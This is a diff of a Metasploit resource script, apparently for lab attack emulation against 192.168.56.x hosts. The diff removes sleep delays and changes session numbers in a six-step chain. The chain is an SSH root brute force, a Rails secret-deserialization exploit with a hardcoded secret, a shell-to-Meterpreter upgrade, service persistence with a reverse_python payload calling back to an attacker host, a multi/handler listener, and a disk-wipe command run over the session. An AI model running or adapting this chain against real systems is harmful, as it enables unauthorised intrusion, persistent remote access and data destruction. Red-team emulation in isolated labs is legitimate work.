@@ -2,16 +2,13 @@
 # STEP 1 - SSH Brute Force
 # ============================================================
 
-sleep 15
-
 use auxiliary/scanner/ssh/ssh_login
 set RHOSTS 192.168.56.181
 set RPORT 22
 set USERNAME root
+# change PASS_FILE with unix_passwords_modified file path
 set PASS_FILE /home/ahnafrr/Desktop/attackmate/unix_passwords_modified.txt
 run
-
-sleep 15
 
 # ============================================================
 # STEP 2 - Rails Secret Deserialization 
@@ -25,7 +22,7 @@ set RHOSTS 192.168.56.181
 set RPORT 8181
 set TARGETURI /
 set SECRET a7aebc287bba0ee4e64f947415a94e5f
-exploit -j
+exploit
 
 # ============================================================
 # STEP 3 - Upgrade Shell to Meterpreter
@@ -35,22 +32,18 @@ use post/multi/manage/shell_to_meterpreter
 set SESSION 1
 run
 
-sleep 15
-
 # ============================================================
 # STEP 4 - Service Persistence
 # ============================================================
 
 use exploit/linux/local/service_persistence
 set payload cmd/unix/reverse_python
-set SESSION 2
+set SESSION 1
 set VERBOSE True
 set LHOST 192.168.56.191
-exploit -j
+exploit
 
 sessions -k 1,2,3
-
-sleep 15
 
 # ============================================================
 # STEP 5 - Multi Handler    
@@ -58,17 +51,15 @@ sleep 15
 
 use exploit/multi/handler
 set payload cmd/unix/reverse_python
-set SESSION 3
+set SESSION 4
 set VERBOSE True
 set LHOST 192.168.56.191
-exploit -j
-
-sleep 15
+exploit
 
 # ============================================================
 # STEP 6 - Disk Wipe
 # ============================================================
 
-sessions -c 'apt install wipe -y' -i 3
+sessions -c 'apt install wipe -y' -i
 sleep 15
-sessions -c "wipe -f {0}/tmp" -i 3
+sessions -c "wipe -f {0}/tmp" -i 
